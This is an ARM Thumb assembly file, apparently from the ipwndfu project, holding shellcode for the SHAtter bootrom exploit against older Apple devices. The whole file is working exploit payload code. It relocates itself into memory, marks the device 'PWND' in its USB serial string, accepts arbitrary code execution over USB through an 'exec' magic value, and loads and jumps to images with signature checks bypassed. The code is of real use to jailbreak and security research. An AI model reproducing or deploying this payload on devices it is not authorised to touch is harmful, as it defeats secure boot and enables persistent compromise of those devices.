@ SHAtter-shellcode.S
@ Author: axi0mX
@ Shellcode for SHAtter exploit with minor improvements:
@ * supports 'exec' magic for code execution over USB
@ * reports PWND:[SHAtter] in USB serial number string

.text

.pool
.set free,                              0x3b95
.set memz_create,                       0x7469
.set memz_destroy,                      0x7451
.set image3_create_struct,              0x412d
.set image3_load_continue,              0x46db
.set image3_load_fail,                  0x47db
.set usb_wait_for_image,                0x4c85
.set jump_to,                           0x5a5d
.set nor_power_on,                      0x4e8d
.set nor_init,                          0x690d
.set memmove,                           0x84dc
.set strlcat,                           0x90c9
.set invalidate_instruction_cache,      0x6480
.set usb_shutdown,                      0x712d

.set gLeakingDFUBuffer,             0x8402dbcc
.set gUSBSerialNumber,              0x8402e0e0

.set RELOCATE_SHELLCODE_ADDRESS,    0x84039800
.set RELOCATE_SHELLCODE_SIZE,             1024
.set MAIN_STACK_ADDRESS,            0x8403c000
.set LOAD_ADDRESS,                  0x84000000
.set MAX_SIZE,                         0x2c000
.set EXEC_MAGIC,                    0x65786563
.set IMAGE3_LOAD_SP_OFFSET,               0x68
.set IMAGE3_LOAD_STRUCT_OFFSET,           0x64
.set SECUREROM_ADDRESS,             0xbf000000
.set SECUREROM_DATA_ADDRESS,        0xbf00c000
.set DATA_ADDRESS,                  0x8402c000
.set DATA_COPY_SIZE,                     0x140

_start: .global _start

.code 16
    MOV R0, #0
    LDR R1, =SECUREROM_ADDRESS
    MOV R2, #128
    LDR R3, =memmove
    BLX R3                                      @ memmove(0, SECUREROM_ADDRESS, 128)

    LDR R0, =DATA_ADDRESS
    LDR R1, =SECUREROM_DATA_ADDRESS
    LDR R2, =DATA_COPY_SIZE
    LDR R3, =memmove
    BLX R3                                      @ memmove(DATA_ADDRESS, SECUREROM_DATA_ADDRESS, DATA_COPY_SIZE)

    LDR R3, =usb_shutdown
    BLX R3                                      @ usb_shutdown()

    LDR R3, =invalidate_instruction_cache
    BLX R3                                      @ invalidate_instruction_cache()

relocate_shellcode:
    MOV R1, PC
    SUB R1, R1, #4                              @ R1 = PC - 4

    LDR R0, =RELOCATE_SHELLCODE_ADDRESS
    CMP R0, R1
    BEQ pwned_dfu_start                         @ if (R1 == RELOCATE_SHELLCODE_ADDRESS) goto pwned_dfu_start

    LDR R2, =RELOCATE_SHELLCODE_SIZE
    LDR R3, =memmove
    BLX R3                                      @ memmove(RELOCATE_SHELLCODE_ADDRESS, R1, RELOCATE_SHELLCODE_SIZE)

    LDR R3, =RELOCATE_SHELLCODE_ADDRESS
    ADD R3, R3, #1
    BX R3                                       @ goto (RELOCATE_SHELLCODE_ADDRESS + 1)

pwned_dfu_start:
    LDR R0, =MAIN_STACK_ADDRESS
    SUB R0, R0, #12
    MOV SP, R0                                  @ SP = MAIN_STACK_ADDRESS - 12

    MOV R0, #1
    MOV R1, #1
    MOV R2, #0
    LDR R3, =nor_power_on
    BLX R3                                      @ nor_power_on(1, 1, 0)

    MOV R0, #0
    LDR R3, =nor_init
    BLX R3                                      @ nor_init(0)

    LDR R0, =gUSBSerialNumber
    ADR R1, PWND_STRING
    MOV R2, #120
    LDR R3, =strlcat
    BLX R3                                      @ strlcat(gUSBSerialNumber, PWND_STRING, 120)

pwned_dfu_loop:
    LDR R3, =usb_wait_for_image
    LDR R0, =LOAD_ADDRESS
    LDR R1, =MAX_SIZE
    BLX R3                                      @ R0 = usb_wait_for_image(LOAD_ADDRESS, MAX_SIZE)

    MOV R4, R0                                  @ R4 = R0

    LDR R1, =gLeakingDFUBuffer
    LDR R0, [R1]                                @ R0 = gLeakingDFUBuffer

    MOV R2, #0
    STR R2, [R1]                                @ gLeakingDFUBuffer = 0

    LDR R3, =free
    BLX R3                                      @ free(R0)

    CMP R4, #0
    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop

    LDR R5, =LOAD_ADDRESS
    LDR R0, [R5]                                @ R0 = LOAD_ADDRESS[0]

    LDR R1, =EXEC_MAGIC
    CMP R0, R1
    BNE pwned_dfu_not_exec_magic                @ if (R0 != EXEC_MAGIC) goto pwned_dfu_not_exec_magic

    LDR R0, [R5, #0x8]                          @ R0 = LOAD_ADDRESS[2]      /* arg1 */

    LDR R1, [R5, #0xC]                          @ R1 = LOAD_ADDRESS[3]      /* arg2 */

    LDR R2, [R5, #0x10]                         @ R2 = LOAD_ADDRESS[4]      /* arg3 */

    LDR R3, [R5, #0x14]                         @ R3 = LOAD_ADDRESS[5]      /* arg4 */

    LDR R4, [R5, #0x18]
    STR R4, [SP]                                @ SP[0] = LOAD_ADDRESS[6]   /* arg5 */

    LDR R4, [R5, #0x1C]
    STR R4, [SP, #0x4]                          @ SP[1] = LOAD_ADDRESS[7]   /* arg6 */

    LDR R4, [R5, #0x20]
    STR R4, [SP, #0x8]                          @ SP[2] = LOAD_ADDRESS[8]   /* arg7 */

    LDR R4, [R5, #0x4]
    BLX R4                                      @ R0 = LOAD_ADDRESS[1](R0, R1, R2, R3, SP[0], SP[1], SP[2])

    STR R0, [R5, #4]                            @ LOAD_ADDRESS[1] = R0

    MOV R1, #0
    STR R1, [R5]                                @ LOAD_ADDRESS[0] = 0

    B pwned_dfu_loop                            @ goto pwned_dfu_loop

pwned_dfu_not_exec_magic:
    LDR R0, =LOAD_ADDRESS
    MOV R1, R4
    MOV R2, #0
    LDR R3, =memz_create
    BLX R3                                      @ R0 = memz_create(LOAD_ADDRESS, R4, 0)

    CMP R0, #0
    BEQ pwned_dfu_loop                          @ if (R0 == 0) goto pwned_dfu_loop /* out of memory :-| */

    LDR R3, =LOAD_ADDRESS
    STR R3, [SP]                                @ SP[0] = LOAD_ADDRESS

    STR R4, [SP, #4]                            @ SP[1] = R4

    MOV R4, R0                                  @ R4 = R0

    MOV R1, SP
    ADD R2, SP, #4
    BL image3_load_no_signature_check           @ R0 = image3_load_no_signature_check(R0, &SP[0], &SP[1])

    CBNZ R0, load_failed                        @ if (R0 != 0) goto load_failed

    LDR R1, =LOAD_ADDRESS
    MOV R2, #0
    LDR R3, =jump_to
    BLX R3                                      @ jump_to(0, LOAD_ADDRESS, 0)

    /* jump_to should never return */

load_failed:
    MOV R0, R4
    LDR R3, =memz_destroy
    BLX R3                                      @ memz_destroy(R4)

    B pwned_dfu_loop                            @ goto pwned_dfu_loop

image3_load_no_signature_check:
    PUSH {R4-R7, LR}                            @ push_registers(R4, R5, R6, R7, LR)

    MOV R6, R11
    MOV R5, R10
    MOV R4, R8
    PUSH {R4-R6}                                @ push_registers(R8, R10, R11)

    ADD R7, SP, #0x18                           @ R7 = SP - 0x18

    LDR R4, =IMAGE3_LOAD_SP_OFFSET
    MOV R5, SP
    SUB R5, R5, R4
    MOV SP, R5                                  @ SP = SP - IMAGE3_LOAD_SP_OFFSET

    MOV R3, #0
    LDR R4, =IMAGE3_LOAD_STRUCT_OFFSET
    ADD R4, R5, R4
    STR R3, [R4]                                @ *(SP + IMAGE3_LOAD_STRUCT_OFFSET) = 0

    STR R2, [SP, #0x10]                         @ SP[4] = R2

    STR R1, [SP, #0x14]                         @ SP[5] = R1

    STR R3, [SP, #0x18]                         @ SP[6] = 0

    LDR R6, [R1]                                @ R6 = *R1

    MOV R10, R1                                 @ R10 = R1

    MOV R11, R3                                 @ R11 = 0

    LDR R1, =MAX_SIZE
    MOV R8, R1                                  @ R8 = MAX_SIZE

    LDR R2, [R0, #4]
    CMP R2, R1
    BGT img3_fail                               @ if (R0[1] > MAX_SIZE) goto img3_fail

    MOV R8, R2                                  @ R8 = R0[1]

    MOV R0, R4
    MOV R1, R6
    LDR R4, =image3_create_struct
    BLX R4
    MOV R4, R0                                  @ R4 = image3_create_struct(SP + IMAGE3_LOAD_STRUCT_OFFSET, R6, R8, 0)

    LDR R3, =image3_load_continue               @ R3 = image3_load_continue

    CBZ R4, img3_branch_R3                      @ if (R4 == 0) goto img3_branch_R3

img3_fail:
    MOV R4, #1                                  @ R4 = 1

    LDR R3, =image3_load_fail                   @ R3 = image3_load_fail

img3_branch_R3:
    BX R3                                       @ goto R3

.align 2

PWND_STRING:
.ascii " PWND:[SHAtter]\x00"
